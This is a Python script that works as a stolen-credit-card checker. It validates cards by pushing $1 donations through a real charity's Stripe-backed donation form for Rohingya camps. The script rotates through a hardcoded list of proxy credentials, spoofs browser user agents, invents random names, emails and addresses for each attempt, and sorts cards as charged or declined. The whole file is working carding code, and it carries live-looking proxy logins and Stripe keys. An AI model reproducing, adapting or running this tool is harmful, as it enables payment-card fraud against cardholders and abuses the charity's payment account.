import aiohttp
import asyncio
import random
import time
import uuid
import re
import string
from urllib.parse import quote
from bs4 import BeautifulSoup

# Stripe Publishable Key (from stripecharge.py)
STRIPE_PK = 'pk_live_SMtnnvlq4TpJelMdklNha8iD'
STRIPE_ACCOUNT = 'acct_1GZkMkI3xcyBhfqp'

# Proxies from stripecharge.py
PROXIES_LIST = [
    "45.38.107.97:6014:qpsiwsym:1d7x54ucvl3x", "107.172.163.27:6543:qpsiwsym:1d7x54ucvl3x",
    "198.105.121.200:6462:qpsiwsym:1d7x54ucvl3x", "sg-sin.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "jp-tok.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2", "ph-man.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "nz-auc.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2", "co-bog.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cl-san.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2", "il-tel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "rs-bel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2", "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "gr-ath.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2", "hu-bud.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lt-sia.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2", "ro-buk.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cz-pra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2", "ee-tal.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ie-dub.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2", "pt-lis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "fi-esp.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2", "31.59.20.176:6754:qpsiwsym:1d7x54ucvl3x",
    "23.95.150.145:6114:qpsiwsym:1d7x54ucvl3x", "198.23.239.134:6540:qpsiwsym:1d7x54ucvl3x",
    "216.10.27.159:6837:qpsiwsym:1d7x54ucvl3x", "142.111.67.146:5611:qpsiwsym:1d7x54ucvl3x",
    "191.96.254.138:6185:qpsiwsym:1d7x54ucvl3x", "31.58.9.4:6077:qpsiwsym:1d7x54ucvl3x",
    "proxy.ttu.edu.tw:3128:g10701005:j0i2m2", "31.59.20.176:6754:spuqbkih:m0x2v6ozxa21",
    "23.95.150.145:6114:spuqbkih:m0x2v6ozxa21", "198.23.239.134:6540:spuqbkih:m0x2v6ozxa21",
    "45.38.107.97:6014:spuqbkih:m0x2v6ozxa21", "107.172.163.27:6543:spuqbkih:m0x2v6ozxa21",
    "198.105.121.200:6462:spuqbkih:m0x2v6ozxa21", "216.10.27.159:6837:spuqbkih:m0x2v6ozxa21",
    "142.111.67.146:5611:spuqbkih:m0x2v6ozxa21", "191.96.254.138:6185:spuqbkih:m0x2v6ozxa21",
    "31.58.9.4:6077:spuqbkih:m0x2v6ozxa21"
]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9RT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

FIRST_NAMES = [
    "John", "James", "Robert", "Michael", "William", "David", "Joseph", "Thomas",
    "Christopher", "Charles", "Daniel", "Matthew", "Anthony", "Mark", "Donald",
    "Steven", "Andrew", "Paul", "Joshua", "Kenneth", "Kevin", "Brian", "George"
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
    "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson"
]

EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com",
    "icloud.com", "mail.com", "zoho.com", "yandex.com", "aol.com"
]

STREET_NAMES = ["Main St", "Oak St", "Pine St", "Maple Ave", "Cedar Rd", "Elm Blvd"]
CITIES = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia"]
STATES = ["ny", "ca", "il", "tx", "az", "pa"]
ZIP_CODES = ["10001", "90001", "60601", "77001", "85001", "19101"]

def parse_proxy(proxy_string):
    """Parse proxy string to aiohttp proxy format"""
    if not proxy_string:
        return None
    proxy_string = proxy_string.strip()
    
    # If already in http:// format
    if proxy_string.startswith(('http://', 'https://')):
        return proxy_string
    
    parts = proxy_string.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f'http://{user}:{pwd}@{ip}:{port}'
    if len(parts) == 2:
        ip, port = parts
        return f'http://{ip}:{port}'
    return None

def generate_random_name():
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    return f"{username}@{random.choice(EMAIL_DOMAINS)}"

def generate_random_address():
    return {
        'line1': f"{random.randint(100, 9999)} {random.choice(STREET_NAMES)}",
        'line2': f"Apt {random.randint(1, 50)}",
        'city': random.choice(CITIES),
        'state': random.choice(STATES),
        'postal_code': random.choice(ZIP_CODES),
        'country': 'US'
    }

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def extract_error_info(response_data):
    result = {"decline_code": None, "message": None}
    if not response_data or not isinstance(response_data, dict):
        return result
    for key in ('error', 'last_payment_error'):
        error = response_data.get(key)
        if isinstance(error, dict):
            result["decline_code"] = error.get('decline_code')
            result["message"] = error.get('message')
            if result["decline_code"] or result["message"]:
                break
    return result

async def get_form_hash(session, proxy=None):
    """Get form hash from mountainofmercy.org"""
    try:
        headers = {
            'x-requested-with': 'XMLHttpRequest',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': get_random_user_agent(),
            'referer': 'https://mountainofmercy.org/give/rohingya-camps/',
            'origin': 'https://mountainofmercy.org'
        }
        data = {
            'action': 'give_donation_form_reset_all_nonce',
            'give_form_id': '3703'
        }
        
        async with session.post(
            "https://mountainofmercy.org/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            response_data = await resp.json(content_type=None)
            return response_data.get('data', {}).get('give_form_hash')
    except Exception:
        return None

async def create_payment_method(session, card_number, exp_month, exp_year, cvv, proxy=None):
    """Create payment method via Stripe API"""
    guid, muid = str(uuid.uuid4()), str(uuid.uuid4())
    name = generate_random_name()
    email = generate_random_email()
    address = generate_random_address()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': get_random_user_agent(),
    }
    
    # URL encode the data properly
    data = {
        'type': 'card',
        'billing_details[name]': name,
        'billing_details[email]': email,
        'billing_details[address][line1]': address['line1'],
        'billing_details[address][line2]': address['line2'],
        'billing_details[address][city]': address['city'],
        'billing_details[address][state]': address['state'],
        'billing_details[address][postal_code]': address['postal_code'],
        'billing_details[address][country]': address['country'],
        'card[number]': card_number,
        'card[cvc]': cvv,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'guid': guid,
        'muid': muid,
        'payment_user_agent': f'stripe.js/badb92382f; stripe-js-v3/badb92382f; split-card-element',
        'key': STRIPE_PK,
        '_stripe_account': STRIPE_ACCOUNT
    }
    
    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as resp:
            response_data = await resp.json(content_type=None)
            if resp.status == 200:
                return response_data.get('id'), None
            err = response_data.get('error', {})
            return None, err.get('message') or err.get('code') or 'Unknown Error'
    except Exception as e:
        return None, str(e)

async def make_donation(session, payment_method_id, form_hash, proxy=None):
    """Process the donation using the payment method"""
    name = generate_random_name()
    first_name = name.split()[0]
    last_name = name.split()[1] if len(name.split()) > 1 else "Doe"
    email = generate_random_email()
    
    headers = {
        'user-agent': get_random_user_agent(),
        'referer': 'https://mountainofmercy.org/give/rohingya-camps/',
        'origin': 'https://mountainofmercy.org',
        'content-type': 'application/x-www-form-urlencoded',
    }
    
    data = {
        'give-form-id': '3703',
        'give-form-hash': form_hash,
        'give-amount': '1',
        'give-form-minimum': '1',
        'give_stripe_payment_method': payment_method_id,
        'give_first': first_name,
        'give_last': last_name,
        'give_email': email,
        'payment-mode': 'stripe_checkout',
        'give_action': 'purchase',
        'give-gateway': 'stripe_checkout'
    }
    
    try:
        async with session.post(
            "https://mountainofmercy.org/give/rohingya-camps/",
            params={'payment-mode': 'stripe_checkout', 'form-id': '3703'},
            headers=headers,
            data=data,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30),
            allow_redirects=True
        ) as resp:
            response_text = await resp.text()
            soup = BeautifulSoup(response_text, 'html.parser')
            
            # Check for error messages
            error_div = soup.find("div", {"id": "give_error_stripe_payment_intent_error"})
            if error_div:
                error_msg = error_div.get_text(strip=True).lower()
                if 'cvc' in error_msg or 'security code' in error_msg:
                    return {"status": "declined", "decline_code": "incorrect_cvc", "response": error_msg}
                if 'insufficient funds' in error_msg:
                    return {"status": "declined", "decline_code": "insufficient_funds", "response": error_msg}
                if '3d' in error_msg or 'authentication' in error_msg:
                    return {"status": "declined", "decline_code": "authentication_required", "response": error_msg}
                return {"status": "declined", "decline_code": "generic_decline", "response": error_msg}
            
            # Check for success indicators
            if 'thank-you' in str(resp.url) or 'success' in response_text.lower():
                return {"status": "charged", "decline_code": "succeeded", "response": "Your card was charged"}
            
            return {"status": "declined", "decline_code": "generic_decline", "response": "Card was declined"}
    except Exception as e:
        return {"status": "error", "decline_code": None, "response": str(e)[:100]}

async def _do_check_async(card_number, exp_month, exp_year, cvv, proxy=None):
    """
    Fully async Stripe check using mountainofmercy.org donation flow.
    """
    user_agent = get_random_user_agent()
    timeout = aiohttp.ClientTimeout(total=30, connect=10)
    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    
    async with aiohttp.ClientSession(
        timeout=timeout,
        connector=connector,
        headers={"User-Agent": user_agent}
    ) as session:
        
        # STEP 1: Get form hash
        await asyncio.sleep(random.uniform(0.5, 1.5))
        form_hash = await get_form_hash(session, proxy=proxy)
        
        if not form_hash:
            raise Exception("Failed to get form hash - site might be down")
        
        await asyncio.sleep(random.uniform(0.5, 1.0))
        
        # STEP 2: Create payment method
        payment_method_id, error = await create_payment_method(
            session, card_number, exp_month, exp_year, cvv, proxy=proxy
        )
        
        if not payment_method_id:
            raise Exception(f"Payment method creation failed: {error}")
        
        await asyncio.sleep(random.uniform(0.5, 1.0))
        
        # STEP 3: Make donation
        result = await make_donation(session, payment_method_id, form_hash, proxy=proxy)
        
        return result

async def check_gate(card_string: str) -> dict:
    """
    Async entry point.
    Input: card|mm|yy|cvv
    Returns: dict with status, decline_code, response
    """
    parts = [p.strip() for p in card_string.split('|')]
    if len(parts) < 4:
        return {"status": "error", "decline_code": None, "response": "Invalid card format"}
    
    card_number = parts[0]
    exp_month = parts[1].zfill(2)
    exp_year = parts[2]
    cvv = parts[3]
    
    # Handle 2-digit or 4-digit year
    if len(exp_year) == 4:
        exp_year = exp_year[2:]
    
    # Try each proxy until one works
    for proxy_str in PROXIES_LIST:
        proxy = parse_proxy(proxy_str)
        try:
            result = await _do_check_async(card_number, exp_month, exp_year, cvv, proxy=proxy)
            # If we got a result (even declined), return it
            if result.get('status') in ['charged', 'declined', 'approved']:
                return result
        except (aiohttp.ClientProxyConnectionError, aiohttp.ClientHttpProxyError, asyncio.TimeoutError):
            continue
        except Exception:
            continue
    
    # Try without proxy as last resort
    try:
        return await _do_check_async(card_number, exp_month, exp_year, cvv, proxy=None)
    except asyncio.TimeoutError:
        return {"status": "error", "decline_code": None, "response": "Timeout"}
    except Exception as e:
        return {"status": "error", "decline_code": None, "response": str(e)[:100]}